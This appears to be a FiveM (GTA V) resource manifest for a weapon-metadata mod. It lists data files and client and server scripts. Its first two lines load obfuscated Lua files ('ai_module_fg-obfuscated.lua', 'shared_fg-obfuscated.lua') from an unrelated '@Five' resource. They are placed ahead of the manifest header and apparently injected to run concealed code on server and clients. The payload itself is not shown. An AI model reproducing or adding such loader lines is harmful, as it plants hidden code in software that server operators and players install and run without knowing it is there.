shared_script '@Five/ai_module_fg-obfuscated.lua'
shared_script '@Five/shared_fg-obfuscated.lua'
fx_version "cerulean"
game "gta5"

author "mmleczek (mmleczek.pl)"
description ""
version "1.0.0"

files {
	"data/loadouts.meta",
	"data/weaponarchetypes.meta",
	"data/weaponanimations.meta",
	"data/pedpersonality.meta",
	"data/weapons.meta"
}

data_file "WEAPON_METADATA_FILE" "data/weaponarchetypes.meta"
data_file "WEAPON_ANIMATIONS_FILE" "data/weaponanimations.meta"
data_file "LOADOUTS_FILE" "data/loadouts.meta"
data_file "WEAPONINFO_FILE" "data/weapons.meta"
data_file "PED_PERSONALITY_FILE" "data/pedpersonality.meta"

server_script 'server.lua'
client_scripts {
	'config.lua',
	'client.lua'
}